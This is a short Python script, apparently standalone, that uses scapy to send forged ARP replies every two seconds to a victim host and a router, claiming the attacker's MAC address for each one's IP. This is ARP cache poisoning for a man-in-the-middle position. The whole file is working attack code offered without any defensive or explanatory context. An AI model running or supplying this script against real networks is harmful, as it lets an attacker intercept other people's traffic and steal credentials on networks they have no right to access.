from scapy.all import *

def spoof_victim():
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "192.168.94.90"
    arp_response.hwdst = "A8-41-F4-B3-FE-27"
    arp_response.hwsrc = "38:fc:98:A5:18:47"
    arp_response.psrc = "192.168.118.208"
    send(arp_response)

def spoof_router():
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "192.168.118.148"
    arp_response.hwdst = "f8:1a:2b:59:08:ab"
    arp_response.hwsrc= "38:fc:98:A5:18:47"
    arp_response.psrc = "192.168.118.181"
    send(arp_response)

if __name__ == "__main__":
    spoof_victim()
    spoof_router()
    try:
        while True:
            spoof_victim()
            spoof_router()
            time.sleep(2)
    except KeyboardInterrupt as err:
        print("exiting")